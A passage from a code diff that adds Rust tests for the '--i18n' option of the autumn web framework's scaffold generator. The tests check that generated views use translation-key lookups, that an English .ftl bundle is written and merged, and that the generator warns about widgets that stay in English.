+        assert!(
+            routes.contains("(\"Api token\", maud::html! { (&row.api_token) })"),
+            "the show view must still render the value:\n{routes}"
+        );
+        // The plaintext sibling is untouched in both.
+        assert!(
+            routes.contains(
+                "Column::new(\"Username\", |row: &Account| maud::html! { (&row.username) })"
+            ),
+            "routes:\n{routes}"
+        );
+    }
+    // ── Issue #1349: `--i18n` translatable scaffold views ────────────────
+
+    /// Every `t!(locale, "key")` key referenced by `src`, in source order.
+    fn t_macro_keys(src: &str) -> Vec<String> {
+        let mut keys = Vec::new();
+        let mut rest = src;
+        while let Some(pos) = rest.find("t!(locale, \"") {
+            let after = &rest[pos + "t!(locale, \"".len()..];
+            let Some(end) = after.find('"') else { break };
+            keys.push(after[..end].to_owned());
+            rest = &after[end..];
+        }
+        keys
+    }
+
+    /// Every top-level key defined in an `.ftl` source.
+    fn ftl_keys(src: &str) -> BTreeSet<String> {
+        src.lines()
+            .filter(|l| !l.trim_start().starts_with('#') && !l.trim().is_empty())
+            .filter(|l| !l.starts_with(' ') && !l.starts_with('\t'))
+            .filter_map(|l| l.split_once('='))
+            .map(|(k, _)| k.trim().to_owned())
+            .collect()
+    }
+
+    fn i18n_options() -> ScaffoldOptions {
+        ScaffoldOptions {
+            i18n: true,
+            ..Default::default()
+        }
+    }
+
+    /// A five-field resource — the shape the issue's success metric measures.
+    fn i18n_fields() -> Vec<String> {
+        vec![
+            "title:String".into(),
+            "body:Text".into(),
+            "published:bool".into(),
+            "views:i64".into(),
+            "author_name:String".into(),
+        ]
+    }
+
+    /// The `html! { … }` view bodies of a generated routes file — every span
+    /// between a `html! {` and the handler's closing `}))`. Used to assert that
+    /// no user-facing English literal survives in the markup itself (AC7).
+    fn view_bodies(routes: &str) -> String {
+        let mut out = String::new();
+        let mut rest = routes;
+        while let Some(pos) = rest.find("html! {") {
+            let after = &rest[pos..];
+            let end = after.find("\n}").unwrap_or(after.len());
+            out.push_str(&after[..end]);
+            out.push('\n');
+            rest = &after[end..];
+        }
+        out
+    }
+
+    /// AC6: without `--i18n`, scaffold output is byte-for-byte unchanged.
+    ///
+    /// What this proves on its own is narrow — both sides run the post-#1349
+    /// generator, so it pins `ScaffoldOptions::default().i18n == false` and the
+    /// absence of any i18n artifact, not equality with the pre-#1349 output.
+    /// The real guard against drift is threefold and lives elsewhere: the
+    /// several hundred existing tests in this module assert the plain path's
+    /// exact strings (`Column::new("Id"`, `("Created at", maud::html!`,
+    /// `confirm('Delete this Post?')`, …) and would fail on any change;
+    /// `integration::scaffold_i18n::views_look_up_every_user_facing_string_through_the_t_macro`
+    /// re-generates without the flag and asserts each of those literals is
+    /// still there; and structurally,
+    /// [`ViewLabels`](super::super::scaffold_i18n::ViewLabels) returns the
+    /// caller's own expression verbatim when the flag is off, so there is no
+    /// second code path that could drift in the first place.
+    /// A nullable `bool` renders a tri-state select whose three options the
+    /// DERIVE fills with hardcoded English (`autumn-macros/src/model.rs`'s
+    /// `form_control_tokens`). Translating the field label and leaving
+    /// `— Unset —`/`Yes`/`No` beside it is exactly the half-done state this
+    /// flag exists to remove, so the scaffold overrides the control.
+    #[test]
+    fn a_nullable_bool_translates_its_own_options() {
+        let tmp = project_with_main(default_main());
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "archived:Option<bool>".into()],
+            "20260427000000",
+            &i18n_options(),
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+
+        let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+        assert!(
+            routes.contains(".override_field(\"archived\", autumn_web::form::FieldControl::Select"),
+            "the derived control's English options must be replaced:\n{routes}"
+        );
+        for key in ["common.select.unset", "common.yes", "common.no"] {
+            assert!(
+                routes.contains(&format!("t!(locale, \"{key}\")")),
+                "{key} must be looked up:\n{routes}"
+            );
+        }
+        // The derive's own submitted values are kept, so form parsing is
+        // untouched: only the labels beside them change.
+        for value in ["(\"\".into()", "(\"true\".into()", "(\"false\".into()"] {
+            assert!(routes.contains(value), "{value} missing:\n{routes}");
+        }
+        // And no English leaks alongside.
+        assert!(
+            !routes.contains("\"— Unset —\".into()") && !routes.contains("\"Yes\".into()"),
+            "{routes}"
+        );
+
+        let ftl = fs::read_to_string(tmp.path().join("i18n/en.ftl")).unwrap();
+        assert!(ftl.contains("common.yes = Yes"), "{ftl}");
+        assert!(ftl.contains("common.no = No"), "{ftl}");
+    }
+
+    #[test]
+    fn i18n_omitted_is_byte_identical_to_default() {
+        let fields = i18n_fields();
+
+        let tmp_default = project_with_main(default_main());
+        plan_scaffold(tmp_default.path(), "Post", &fields, "20260427000000")
+            .unwrap()
+            .execute(Flags::default())
+            .unwrap();
+
+        let tmp_explicit = project_with_main(default_main());
+        plan_scaffold_with_options(
+            tmp_explicit.path(),
+            "Post",
+            &fields,
+            "20260427000000",
+            &ScaffoldOptions {
+                i18n: false,
+                ..Default::default()
+            },
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+
+        for rel in [
+            "src/routes/posts.rs",
+            "src/models/post.rs",
+            "src/repositories/post.rs",
+            "migrations/20260427000000_create_posts/up.sql",
+            "src/main.rs",
+            "Cargo.toml",
+        ] {
+            let a = fs::read_to_string(tmp_default.path().join(rel)).unwrap();
+            let b = fs::read_to_string(tmp_explicit.path().join(rel)).unwrap();
+            assert_eq!(a, b, "`i18n: false` must not change `{rel}`");
+            assert!(
+                !b.contains("t!(locale"),
+                "non-i18n `{rel}` must carry no `t!` lookups:\n{b}"
+            );
+        }
+        assert!(
+            !tmp_default.path().join("i18n/en.ftl").exists(),
+            "a non-i18n scaffold must not create an `.ftl` stub"
+        );
+    }
+
+    /// AC2: page titles, buttons, links, and per-field labels are `t!` lookups.
+    #[test]
+    fn i18n_scaffold_emits_t_macro_lookups_for_every_view_string() {
+        let tmp = project_with_main(default_main());
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &i18n_fields(),
+            "20260427000000",
+            &i18n_options(),
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+        let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+
+        let keys: BTreeSet<String> = t_macro_keys(&routes).into_iter().collect();
+        for expected in [
+            "common.create",
+            "common.save",
+            "common.back",
+            "common.edit",
+            "common.delete",
+            "common.show",
+            "post.new",
+            "post.name.plural",
+            "post.field.title",
+            "post.field.author_name",
+            "post.flash.created",
+        ] {
+            assert!(
+                keys.contains(expected),
+                "missing `t!` key `{expected}`; got {keys:?}"
+            );
+        }
+    }
+
+    /// AC7: no hardcoded English label literal survives in the view body.
+    #[test]
+    fn i18n_view_bodies_carry_no_hardcoded_label_literals() {
+        let tmp = project_with_main(default_main());
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &i18n_fields(),
+            "20260427000000",
+            &i18n_options(),
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+        let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+        let bodies = view_bodies(&routes);
+
+        for literal in [
+            "\"New Post\"",
+            "\"Create\"",
+            "\"Save\"",
+            "\"Delete\"",
+            "\"Back to list\"",
+            "\"Edit\"",
+            "\"Show\"",
+            "\"Post index\"",
+            "\"Posts\"",
+            "\"Title\"",
+            "\"Author Name\"",
+            "\"Author name\"",
+        ] {
+            assert!(
+                !bodies.contains(literal),
+                "view body still carries the hardcoded literal {literal}:\n{bodies}"
+            );
+        }
+        // The whole file, not just the markup: labels reach the widgets through
+        // `let` bindings and `override_label` calls outside `html! { … }` too.
+        assert!(
+            !routes.contains("Column::new(\"Title\""),
+            "index column headers must be translated:\n{routes}"
+        );
+        assert!(
+            !routes.contains("(\"Created at\", maud::html!"),
+            "show property labels must be translated:\n{routes}"
+        );
+    }
+
+    /// The Markdown editor's own chrome lives in autumn-web, behind no
+    /// parameter this generator can route a `t!` through, so an `--i18n`
+    /// scaffold with a `richtext` column translates everything EXCEPT that
+    /// widget. Silence would be the bug — the flag promises the whole view.
+    #[test]
+    fn i18n_says_so_when_the_rich_text_editor_keeps_english_chrome() {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "body:richtext".into()],
+            "20260501000000",
+            &i18n_options(),
+        )
+        .unwrap();
+
+        let warning = plan
+            .warnings
+            .iter()
+            .find(|w| w.contains("Markdown editor"))
+            .unwrap_or_else(|| panic!("no rich-text warning in {:?}", plan.warnings));
+        assert!(
+            warning.contains("`body`"),
+            "must name the column: {warning}"
+        );
+
+        // A scaffold without one says nothing.
+        let tmp2 = project_with_main(default_main());
+        let without_rich_text = plan_scaffold_with_options(
+            tmp2.path(),
+            "Post",
+            &["title:String".into()],
+            "20260501000000",
+            &i18n_options(),
+        )
+        .unwrap();
+        assert!(
+            !without_rich_text
+                .warnings
+                .iter()
+                .any(|w| w.contains("Markdown editor")),
+            "{:?}",
+            without_rich_text.warnings
+        );
+        assert!(
+            !without_rich_text
+                .warnings
+                .iter()
+                .any(|w| w.contains("state-transition controls")),
+            "{:?}",
+            without_rich_text.warnings
+        );
+    }
+
+    /// A translated field label with an English error under it is the same
+    /// half-done state the widget gaps are, and it is reached the same way:
+    /// `validator` takes `message` as a compile-time literal, so no runtime
+    /// lookup can go there, and the code-to-message mapping lives inside
+    /// autumn-web's changeset conversion.
+    #[test]
+    fn i18n_says_so_when_validation_messages_stay_english() {
+        let tmp = project_with_main(default_main());
+        let mut options = i18n_options();
+        options.model.validations = vec!["email=email".to_owned()];
+        let plan = plan_scaffold_with_options(
+            tmp.path(),
+            "Contact",
+            &["email:String".into()],
+            "20260503000000",
+            &options,
+        )
+        .unwrap();
+
+        let warning = plan
+            .warnings
+            .iter()
+            .find(|w| w.contains("#[validate(...)]"))
+            .unwrap_or_else(|| panic!("no validation warning in {:?}", plan.warnings));
+        assert!(
+            warning.contains("validation failed: <code>"),
+            "must show what the author will actually see: {warning}"
+        );
+
+        // A scaffold with no rules has nothing to warn about.
+        let unvalidated = plan_scaffold_with_options(
+            tmp.path(),
+            "Note",
+            &["body:Text".into()],
+            "20260503000001",
+            &i18n_options(),
+        )
+        .unwrap();
+        assert!(
+            !unvalidated
+                .warnings
+                .iter()
+                .any(|w| w.contains("#[validate(...)]")),
+            "{:?}",
+            unvalidated.warnings
+        );
+    }
+
+    /// `transition_controls` builds `Mark as {to}` and the `{field} transitions`
+    /// group label inside autumn-web, from positional arguments that carry no
+    /// label seam — the same shape as the Markdown editor, and named the same
+    /// way rather than left for the reader to find in the browser.
+    #[test]
+    fn i18n_says_so_when_the_transition_controls_keep_english_chrome() {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold_with_options(
+            tmp.path(),
+            "Order",
+            &[
+                "title:String".into(),
+                "status:String:states(draft -> published, published -> archived)".into(),
+            ],
+            "20260502000000",
+            &i18n_options(),
+        )
+        .unwrap();
+
+        let warning = plan
+            .warnings
+            .iter()
+            .find(|w| w.contains("state-transition controls"))
+            .unwrap_or_else(|| panic!("no transition warning in {:?}", plan.warnings));
+        assert!(
+            warning.contains("`status`"),
+            "must name the column: {warning}"
+        );
+        assert!(
+            warning.contains("transition_controls"),
+            "must name the widget the author has to look at: {warning}"
+        );
+    }
+
+    /// A standalone `autumn-<profile>.toml` is layered LAST, so it wins over
+    /// `autumn.toml` — and a project that keeps production config in one has no
+    /// `[profile.prod.i18n]` for the inline scan to find. Silence there is the
+    /// loudest failure: `.i18n_auto()` panics at startup on the missing bundle.
+    #[test]
+    fn i18n_warns_about_a_standalone_profile_override_file() {
+        let tmp = project_with_main(default_main());
+        fs::write(
+            tmp.path().join("autumn-prod.toml"),
+            "[i18n]\ndir = \"translations\"\ndefault_locale = \"fr\"\n",
+        )
+        .unwrap();
+
+        let plan = plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &i18n_fields(),
+            "20260504000000",
+            &i18n_options(),
+        )
+        .unwrap();
+
+        let warning = plan
+            .warnings
+            .iter()
+            .find(|w| w.contains("autumn-prod.toml"))
+            .unwrap_or_else(|| panic!("no profile-file warning in {:?}", plan.warnings));
+        assert!(
+            warning.contains("translations/fr.ftl"),
+            "must name the bundle the deploy actually loads: {warning}"
+        );
+    }
+
+    /// AC7: a refused transition is user-facing, and the error's own Display is
+    /// built in autumn-macros as hardcoded English — so the flash carries a
+    /// translated message instead of the error text.
+    #[test]
+    fn i18n_translates_the_rejected_transition_flash() {
+        let tmp = project_with_main(default_main());
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Order",
+            &[
+                "title:String".into(),
+                "status:String:states(draft -> published, published -> archived)".into(),
+            ],
+            "20260506000000",
+            &i18n_options(),
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+        let routes = fs::read_to_string(tmp.path().join("src/routes/orders.rs")).unwrap();
+        let ftl = fs::read_to_string(tmp.path().join("i18n/en.ftl")).unwrap();
+
+        assert!(
+            routes.contains("flash.error(t!(locale, \"common.transition.rejected\"))"),
+            "the rejection must come from the bundle:\n{routes}"
+        );
+        assert!(
+            !routes.contains("flash.error(err.to_string())"),
+            "the English error text must not reach the flash:\n{routes}"
+        );
+        assert!(ftl.contains("common.transition.rejected = "), "{ftl}");
+    }
+
+    /// Without the flag the flash is the error's own text, as before.
+    #[test]
+    fn without_i18n_the_rejected_transition_flash_is_the_error() {
+        let tmp = project_with_main(default_main());
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Order",
+            &[
+                "title:String".into(),
+                "status:String:states(draft -> published, published -> archived)".into(),
+            ],
+            "20260506000000",
+            &ScaffoldOptions::default(),
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+        let routes = fs::read_to_string(tmp.path().join("src/routes/orders.rs")).unwrap();
+        assert!(routes.contains("flash.error(err.to_string())"), "{routes}");
+    }
+
+    /// AC7: the conflict banner is what an author reads at the moment their
+    /// save is rejected — the last place to fall back to English.
+    #[test]
+    fn i18n_translates_the_lock_conflict_banner() {
+        let tmp = project_with_main(default_main());
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "lock_version:i32".into()],
+            "20260505000000",
+            &i18n_options(),
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+        let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+        let ftl = fs::read_to_string(tmp.path().join("i18n/en.ftl")).unwrap();
+
+        assert!(
+            routes.contains("t!(locale, \"common.lock.conflict\")"),
+            "the banner must come from the bundle:\n{routes}"
+        );
+        assert!(
+            !routes.contains("\"This record was changed by someone else"),
+            "the English literal must be gone:\n{routes}"
+        );
+        assert!(
+            ftl.contains("common.lock.conflict = This record was changed"),
+            "{ftl}"
+        );
+    }
+
+    /// AC7: the duplicate-value error is shown to whoever submitted the form,
+    /// so it is view text too. It cannot ride in `UNIQUE_CONSTRAINTS` — a
+    /// `const` is evaluated before any request has a locale — so the const
+    /// keeps the mapping and the message is resolved in the handler.
+    #[test]
+    fn i18n_translates_the_unique_violation_message() {
+        let tmp = project_with_main(default_main());
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &["title:String:unique".into()],
+            "20260503000000",
+            &i18n_options(),
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+        let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+        let ftl = fs::read_to_string(tmp.path().join("i18n/en.ftl")).unwrap();
+
+        assert!(
+            routes.contains("vec![t!(locale, \"common.error.taken\")]"),
+            "the message must be resolved per request:\n{routes}"
+        );
+        assert!(
+            ftl.contains("common.error.taken = has already been taken"),
+            "{ftl}"
+        );
+        // The const still carries the constraint -> field mapping; only the
+        // message slot stops being the thing rendered.
+        assert!(routes.contains("const UNIQUE_CONSTRAINTS"), "{routes}");
+    }
+
+    /// Without the flag the whole path is byte-for-byte as it was, including
+    /// the binding name.
+    #[test]
+    fn without_i18n_the_unique_violation_message_is_the_const_text() {
+        let tmp = project_with_main(default_main());
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &["title:String:unique".into()],
+            "20260503000000",
+            &ScaffoldOptions::default(),
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+        let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+        assert!(routes.contains("vec![message.to_string()]"), "{routes}");
+        assert!(
+            routes.contains("if let Some((field, message)) ="),
+            "{routes}"
+        );
+    }
+
+    /// AC7: the attachment meta span is view text like any other.
+    ///
+    /// `attachment_link` renders `(image/png, 17 bytes)` beside the download
+    /// link on both the show and edit pages. The media type and the count are
+    /// data, but the parentheses, the comma and the unit noun are language — so
+    /// the whole pattern comes from the bundle and the two values interpolate
+    /// as Fluent arguments. Left hardcoded, every non-English scaffold with an
+    /// attachment column renders a stray English "bytes".
+    #[test]
+    fn i18n_translates_the_attachment_size_meta() {
+        let tmp = project_with_main(default_main());
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "cover:Attachment".into()],
+            "20260430000000",
+            &i18n_options(),
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+        let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+        let ftl = fs::read_to_string(tmp.path().join("i18n/en.ftl")).unwrap();
+
+        assert!(
+            !routes.contains("\" bytes)\""),
+            "the size suffix must not stay hardcoded English:\n{routes}"
+        );
+        assert!(
+            routes.contains("t!(locale, \"common.attachment.meta\""),
+            "the meta span must come from the bundle:\n{routes}"
+        );
+        assert!(
+            ftl.contains("common.attachment.meta = ({ $media }, { $size } bytes)"),
+            "the pattern a translator reorders must be the whole span:\n{ftl}"
+        );
+        // The helper cannot reach a `Locale` it was not handed, and both call
+        // sites are handlers that hold one.
+        assert!(
+            routes.contains("locale: &autumn_web::i18n::Locale,"),
+            "`attachment_link` must take the locale under `--i18n`:\n{routes}"
+        );
+        assert!(
+            routes.contains("attachment_link(&locale, Some(blob)")
+                && routes.contains("attachment_link(&locale, row.cover.as_ref()"),
+            "both the edit and show call sites must pass it:\n{routes}"
+        );
+    }
+
+    /// The same scaffold WITHOUT the flag keeps the helper exactly as it was —
+    /// the flag's byte-for-byte promise covers this seam too.
+    #[test]
+    fn without_i18n_the_attachment_meta_stays_a_plain_literal() {
+        let tmp = project_with_main(default_main());
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "cover:Attachment".into()],
+            "20260430000000",
+            &ScaffoldOptions::default(),
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+        let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+
+        assert!(
+            routes.contains("\"(\" (blob.content_type) \", \" (blob.byte_size) \" bytes)\""),
+            "the non-i18n meta span must be untouched:\n{routes}"
+        );
+        assert!(
+            !routes.contains("autumn_web::i18n::Locale"),
+            "no locale plumbing without the flag:\n{routes}"
+        );
+        assert!(
+            routes.contains("attachment_link(Some(blob)"),
+            "the call sites must keep their original arity:\n{routes}"
+        );
+    }
+
+    /// AC4/AC7: every referenced key exists in the emitted `en.ftl`, and the
+    /// file carries no key the views never reference (which `autumn i18n check`
+    /// would report as unused).
+    #[test]
+    fn i18n_en_ftl_matches_the_referenced_key_set_exactly() {
+        let tmp = project_with_main(default_main());
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &i18n_fields(),
+            "20260427000000",
+            &i18n_options(),
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+        let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+        let ftl = fs::read_to_string(tmp.path().join("i18n/en.ftl")).unwrap();
+
+        let referenced: BTreeSet<String> = t_macro_keys(&routes).into_iter().collect();
+        let defined = ftl_keys(&ftl);
+        assert!(!referenced.is_empty(), "expected `t!` keys in:\n{routes}");
+        let missing: Vec<_> = referenced.difference(&defined).collect();
+        assert!(
+            missing.is_empty(),
+            "keys referenced but not defined in en.ftl: {missing:?}\n{ftl}"
+        );
+        let unused: Vec<_> = defined.difference(&referenced).collect();
+        assert!(
+            unused.is_empty(),
+            "keys defined in en.ftl but never referenced: {unused:?}\n{routes}"
+        );
+        // English values, so an `en` app reads exactly like the plain scaffold.
+        assert!(ftl.contains("common.create = Create"), "{ftl}");
+        assert!(ftl.contains("common.save = Save"), "{ftl}");
+        assert!(ftl.contains("common.back = Back to list"), "{ftl}");
+        assert!(ftl.contains("post.new = New Post"), "{ftl}");
+        assert!(ftl.contains("post.field.title = Title"), "{ftl}");
+        assert!(
+            ftl.contains("post.field.author_name = Author Name"),
+            "{ftl}"
+        );
+    }
+
+    /// AC3: every view-rendering handler takes the `Locale` extractor so the
+    /// macro has a `locale` in scope.
+    #[test]
+    fn i18n_view_handlers_take_the_locale_extractor() {
+        let tmp = project_with_main(default_main());
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &i18n_fields(),
+            "20260427000000",
+            &i18n_options(),
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+        let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+
+        assert!(
+            routes.contains("use autumn_web::i18n::Locale;"),
+            "routes must import the extractor:\n{routes}"
+        );
+        for handler in [
+            "pub async fn index(",
+            "pub async fn show(",
+            "pub async fn new_form(",
+            "pub async fn edit_form(",
+            "pub async fn create(",
+            "pub async fn update(",
+        ] {
+            let start = routes
+                .find(handler)
+                .unwrap_or_else(|| panic!("missing handler `{handler}`:\n{routes}"));
+            let sig_end = routes[start..].find(") ->").unwrap_or_else(|| {
+                panic!("unterminated signature for `{handler}`");
+            });
+            let sig = &routes[start..start + sig_end];
+            assert!(
+                sig.contains("locale: Locale"),
+                "`{handler}` must take the Locale extractor, got:\n{sig}"
+            );
+        }
+        // The extractor must precede any body-consuming extractor — axum only
+        // allows one `FromRequest` argument, and it has to be last.
+        if let Some(start) = routes.find("pub async fn create(") {
+            let sig = &routes[start..start + routes[start..].find(") ->").unwrap()];
+            let locale_at = sig.find("locale: Locale").unwrap();
+            if let Some(body_at) = sig.find("body: Bytes") {
+                assert!(locale_at < body_at, "Locale must precede the body:\n{sig}");
+            }
+        }
+    }
+
+    /// AC3: the `--api` (JSON) path is unaffected — no labels to translate, so
+    /// no `t!` calls, no `Locale` extractor, and no `.ftl` stub.
+    #[test]
+    fn i18n_api_scaffold_output_is_unaffected() {
+        let fields = i18n_fields();
+        let tmp_plain = project_with_main(default_main());
+        plan_scaffold_with_options(
+            tmp_plain.path(),
+            "Post",
+            &fields,
+            "20260427000000",
+            &ScaffoldOptions {
+                api: true,
+                ..Default::default()
+            },
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+
+        let tmp_i18n = project_with_main(default_main());
+        plan_scaffold_with_options(
+            tmp_i18n.path(),
+            "Post",
+            &fields,
+            "20260427000000",
+            &ScaffoldOptions {
+                api: true,
+                i18n: true,
+                ..Default::default()
+            },
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+
+        for rel in [
+            "src/models/post.rs",
+            "src/repositories/post.rs",
+            "Cargo.toml",
+        ] {
+            let a = fs::read_to_string(tmp_plain.path().join(rel)).unwrap();
+            let b = fs::read_to_string(tmp_i18n.path().join(rel)).unwrap();
+            assert_eq!(a, b, "`--api --i18n` must not change `{rel}`");
+        }
+        assert!(
+            !tmp_i18n.path().join("i18n/en.ftl").exists(),
+            "an `--api` scaffold references no labels, so it writes no `.ftl`"
+        );
+    }
+
+    /// AC5: shared chrome keys are emitted once and reused — a second resource
+    /// adds only its own nouns, never a duplicate `common.*` entry.
+    #[test]
+    fn i18n_common_chrome_keys_are_emitted_once_across_resources() {
+        let tmp = project_with_main(default_main());
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &["title:String".into()],
+            "20260427000000",
+            &i18n_options(),
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Comment",
+            &["body:Text".into()],
+            "20260427000001",
+            &i18n_options(),
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+
+        let ftl = fs::read_to_string(tmp.path().join("i18n/en.ftl")).unwrap();
+        assert_eq!(
+            ftl.matches("common.create =").count(),
+            1,
+            "shared chrome must be emitted exactly once:\n{ftl}"
+        );
+        assert_eq!(ftl.matches("common.back =").count(), 1, "{ftl}");
+        let keys = ftl_keys(&ftl);
+        assert!(keys.contains("post.field.title"), "{ftl}");
+        assert!(keys.contains("comment.field.body"), "{ftl}");
+        assert!(
+            !keys.iter().any(|k| k.starts_with("comment.create")),
+            "chrome must not be duplicated per model:\n{ftl}"
+        );
+    }
+
+    /// AC4: an `en.ftl` the user has already translated survives regeneration —
+    /// existing values are never rewritten, only missing keys are appended.
+    #[test]
+    fn i18n_merges_into_an_existing_en_ftl_without_clobbering_values() {
+        let tmp = project_with_main(default_main());
+        fs::create_dir_all(tmp.path().join("i18n")).unwrap();
+        fs::write(
+            tmp.path().join("i18n/en.ftl"),
+            "# hand-written\nwelcome.title = Welcome\ncommon.create = Add\n",
+        )
+        .unwrap();
+
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &["title:String".into()],
+            "20260427000000",
+            &i18n_options(),
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+
+        let ftl = fs::read_to_string(tmp.path().join("i18n/en.ftl")).unwrap();
+        assert!(ftl.contains("welcome.title = Welcome"), "{ftl}");
+        assert!(
+            ftl.contains("common.create = Add"),
+            "an existing value must not be rewritten:\n{ftl}"
+        );
+        assert!(!ftl.contains("common.create = Create"), "{ftl}");
+        assert!(ftl.contains("post.field.title = Title"), "{ftl}");
+    }
+
+    /// AC4 ("zero further config"): the generated app actually resolves the
+    /// keys — the `i18n` feature is on, `[i18n]` is configured, and the builder
+    /// loads the bundle.
+    #[test]
+    fn i18n_wires_the_project_so_keys_resolve_with_no_further_config() {
+        let tmp = project_with_main(default_main());
+        fs::write(tmp.path().join("autumn.toml"), "[server]\nport = 3000\n").unwrap();
+        // A real `autumn new` project declares autumn-web; the bare fixture does
+        // not, and a feature cannot be added to a dependency that isn't there.
+        fs::write(
+            tmp.path().join("Cargo.toml"),
+            "[package]\nname=\"x\"\n\n[dependencies]\nautumn-web = \"0.6\"\n",
+        )
+        .unwrap();
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &["title:String".into()],
+            "20260427000000",
+            &i18n_options(),
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+
+        let cargo = fs::read_to_string(tmp.path().join("Cargo.toml")).unwrap();
+        assert!(
+            cargo.contains("\"i18n\""),
+            "the `i18n` feature must be enabled:\n{cargo}"
+        );
+        let toml = fs::read_to_string(tmp.path().join("autumn.toml")).unwrap();
+        assert!(toml.contains("[i18n]"), "{toml}");
+        assert!(toml.contains("default_locale = \"en\""), "{toml}");
+        let main_rs = fs::read_to_string(tmp.path().join("src/main.rs")).unwrap();
+        assert!(
+            main_rs.contains(".i18n_auto()"),
+            "the builder must load the bundle:\n{main_rs}"
+        );
+    }
+
+    /// AC1: `--i18n` composes with `--searchable` and `--soft-delete`; the
+    /// strings those variants add are translated too.
+    #[test]
+    fn i18n_composes_with_searchable_and_soft_delete() {
+        let tmp = project_with_main(default_main());
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "body:Text".into()],
+            "20260427000000",
+            &ScaffoldOptions {
+                i18n: true,
+                model: ModelOptions {
+                    searchable: vec!["title".into(), "body".into()],
+                    soft_delete: true,
+                    ..Default::default()
+                },
+                ..Default::default()
+            },
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+
+        let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+        let ftl = fs::read_to_string(tmp.path().join("i18n/en.ftl")).unwrap();
+        let referenced: BTreeSet<String> = t_macro_keys(&routes).into_iter().collect();
+        let defined = ftl_keys(&ftl);
+        assert!(
+            referenced.difference(&defined).next().is_none(),
+            "searchable+trash keys must all be defined:\n{ftl}"
+        );
+        assert!(
+            !routes.contains("\"Search Posts\""),
+            "the search page's strings must be translated:\n{routes}"
+        );
+        assert!(
+            !routes.contains("\"Restore\"") && !routes.contains("\"Trash is empty.\""),
+            "the trash view's strings must be translated:\n{routes}"
+        );
+    }
+
+    /// The variants whose views render outside a request handler (`--live`'s
+    /// SSE fragment) or through a separate nested renderer are refused up front
+    /// rather than silently emitting English under an i18n flag.
+    #[test]
+    fn i18n_rejects_the_view_variants_it_cannot_translate() {
+        for (label, options) in [
+            (
+                "--live",
+                ScaffoldOptions {
+                    i18n: true,
+                    live: true,
+                    ..Default::default()
+                },
+            ),
+            (
+                "--live-validation",
+                ScaffoldOptions {
+                    i18n: true,
+                    live_validation: true,
+                    ..Default::default()
+                },
+            ),
+            (
+                "--belongs-to",
+                ScaffoldOptions {
+                    i18n: true,
+                    belongs_to: Some("Post".into()),
+                    ..Default::default()
+                },
+            ),
+        ] {
+            let tmp = project_with_main(default_main());
+            let err = plan_scaffold_with_options(
+                tmp.path(),
+                "Comment",
+                &["body:Text".into()],
+                "20260427000000",
+                &options,
+            )
+            .unwrap_err();
+            assert!(
+                matches!(err, GenerateError::Config(_)),
+                "{label}: expected a Config error, got {err:?}"
+            );
+            let msg = err.to_string();
+            assert!(
+                msg.contains("--i18n") && msg.contains(label),
+                "{label}: the error must name both flags: {msg}"
+            );
+        }
+    }
+
+    /// AC1/AC2: the `--belongs-to` refusal has to hold for nesting this run
+    /// INFERRED as well as nesting it was told about.
+    ///
+    /// `--belongs-to` is typed once, when the relationship is created; the
